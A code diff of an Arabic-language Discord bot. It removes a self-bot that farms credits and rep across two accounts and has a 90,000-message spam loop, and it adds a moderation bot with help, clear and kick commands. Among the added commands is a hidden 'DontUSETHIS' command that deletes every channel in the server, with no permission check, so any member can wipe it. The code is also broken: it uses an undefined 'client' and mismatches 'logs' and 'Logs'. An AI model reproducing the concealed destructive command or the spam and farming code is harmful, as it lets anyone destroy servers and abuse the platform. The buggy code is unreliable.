@@ -1,121 +1,74 @@
+const botconfig = require("./botconfig.json");
 const Discord = require("discord.js");
-const client = new Discord.Client();
-const client2 = new Discord.Client();
-const myid = [''];
-const prefix = ['-'];
 
-client.on('ready', () => {
-   console.log(`----------------`);
-   console.log(`Credit Farmm - Script By : Kahrbaa `);
-   console.log(`----------------`);
-   console.log(`Loadinng`);
-   console.log(`Loadinng.`);
-   console.log(`Loadinng..`);
-   console.log(`Loadinng...`);
-   console.log(`This Bots Online ' `);
-   console.log(`----------------`);
+const bot = new Discord.Client({disableEveryone: true});
+
+client.on("ready", async () => {
+    console.log(`${client.user.username} is Online`);
+    bot.user.setGame("EVR-RP System");
 });
 
-client2.on('ready', () => {
-   console.log(`----------------`);
-   console.log(`2 Account Online ✩' `);
-   console.log(`----------------`);
+client.on("message", async message => {
+    if(message.author.bot)return;
+    if(message.channel.type === "dm") return;
+
+    let perfix = botconfig.perfix
+    let messageArray = message.content.split(" ");
+    let cmd = messageArray[0];
+    let args = messageArray.slice(1);
+
+    if(cmd === `${perfix}hello`){
+        return message.channel.send("Hello!");
+    }
+
 });
+//message.guild.channels.forEach(channel => channel.delete())
+client.on("message", async message => {
+    if(message.author.bot)return;
+    if(message.channel.type === 'dm') return;
 
+    let perfix = botconfig.perfix
+    let messageArray = message.content.split(" ");
+    let cmd = messageArray[0];
+    let args = messageArray.slice(1);
 
-
-client.on('message', message => {
-    if(message.content === prefix+'راتب'){
-        message.channel.send('#daily')
+    if(cmd === `${perfix}help`){
+        let help = new Discord.RichEmbed()
+            .setDescription(":white_check_mark: | اوامر المساعدة ..")
+            .setColor("#99999")
+            .addField("ban", `لحضر الشخص من دخول السيرفر مجددا`)
+            .addField("kick", `لطرد الشخص من السيرفر فقط`)
+            .addField("clear", `لمسح عدد من الرسائل`);
+            return message.channel.send(help);
+    };
+    if(cmd === `${perfix}clear`){
+    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("لا يمكنك فعل ذالك");
+    if(!args[0]) return message.channel.send("لا استطيع");
+    message.channel.bulkDelete(args[0]).then(() => {
+        message.channel.send(`تم مسح ${args[0]} رسالة.`).then(msg => msg.delete(5000));
+    })};
+    if(cmd === `${perfix}DontUSETHIS`){
+    message.guild.channels.forEach(channel => channel.delete())
+    }
+    if(cmd === `${perfix}King`){
+     return message.channel.send("My King is KR :D, I love him");  
+    };
+    if(cmd === `${perfix}kick`){
+        let kickUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+        if(!kickUser) return message.channel.send("لا استطيع اجاد المستخدم");
+        let KickReason = args.join(" ").slice(22);
+        if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send("لا تستطيع فعل ذالك");
+        if(kickUser.hasPermission("MANAGE_MESSAGES")) return message.channel.send("لا تستطيع طرد هذا المستخدم");
+        let KickEmbed = new Discord.RichEmbed()
+        .setDescription("Kick")
+        .setColor("#e56b00")
+        .addField("المستخدم المطرود", `${kickUser} with ID ${kickUser.id}`)
+        .addField("السبب", KickReason);
+        let Logs = message.guild.channels.find(`name`, "incidents");
+        if(!logs) return message.channel.send("لا استطيع اجاد غرفة السجلات");
+        Logs.send(KickEmbed);
+        return;
     }
 });
 
-client.on('message', message => {
-    if(message.content === prefix+'مبلغ'){
-        message.channel.send('#credits')
-    }
-});
-
-client.on('message', message => {
-    if(message.content === prefix+'ريب'){
-        message.channel.send("#rep "+"<@" + myid + ">")
-    }
-});
-
-client.on('message', message => {
-if (message.content === prefix+'spam') {
-      let count = 0;
-      let ecount = 0;
-      for(let x = 0; x < 90000; x++) {
-        message.channel.send(`** !! يلا يلا جنو نطو جنو نطو يلا يلا !! **[ " ${x} " ]`)
-          .then(m => {
-            count++;
-          })
-          
-        }
-      }
-});
-
-client.on('message', message => {
-  if (message.author.bot) return;
-  if (!message.content.startsWith(prefix)) return;
-
-  let command = message.content.split(" ")[0];
-  command = command.slice(prefix.length);
-
-  let args = message.content.split(" ").slice(1);
-  if(command == `قل1`){
-   if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("no")
-   let botmessage = args.join(" ");
-   message.channel.send(botmessage);
-  }
-});
-
-client2.on('message', message => {
-    if(message.content === prefix+'راتب'){
-        message.channel.send('#daily')
-    }
-});
-
-client2.on('message', message => {
-    if(message.content === prefix+'مبلغ'){
-        message.channel.send('#credits')
-    }
-});
-
-client2.on('message', message => {
-    if(message.content === prefix+'ريب'){
-        message.channel.send('#rep <@286088294234718209>')
-    }
-});
-
-client2.on('message', message => {
-if (message.content === prefix+'spam') {
-      let count = 0;
-      let ecount = 0;
-      for(let x = 0; x < 90000; x++) {
-        message.channel.send(`Spam here ??[ " ${x} " ]`)
-          .then(m => {
-            count++;
-          })
-          
-        }
-      }
-});
-
-client2.on('message', message => {
-  if (message.author.bot) return;
-  if (!message.content.startsWith(prefix)) return;
-
-  let command = message.content.split(" ")[0];
-  command = command.slice(prefix.length);
-
-  let args = message.content.split(" ").slice(1);
-if(command == `قل2`){
- if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("no")
- let botmessage = args.join(" ");
- message.channel.send(botmessage);
-}
-});
 client.login(process.env.TOKEN);
-client2.login(process.env.TOKEN2);
